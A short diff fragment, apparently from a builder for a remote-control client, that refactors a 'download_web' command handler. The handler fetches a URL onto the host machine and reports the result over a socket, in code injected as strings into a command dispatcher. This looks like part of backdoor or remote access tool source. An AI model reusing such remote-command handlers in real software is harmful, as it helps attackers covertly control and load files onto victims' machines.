@@ -15,7 +15,7 @@ def download_web(command):
     f = open(file_name, 'wb')
     f.write(url_data)
     f.close()
-    s.sendall(('[+]Downloaded : ' + url + ' -> ' + file_name).encode())''')
+    send_all(s,'[+]Downloaded : ' + url + ' -> ' + file_name)''')
         config.logics.append('''
             elif command == "download_web":
                 download_web(data)''')
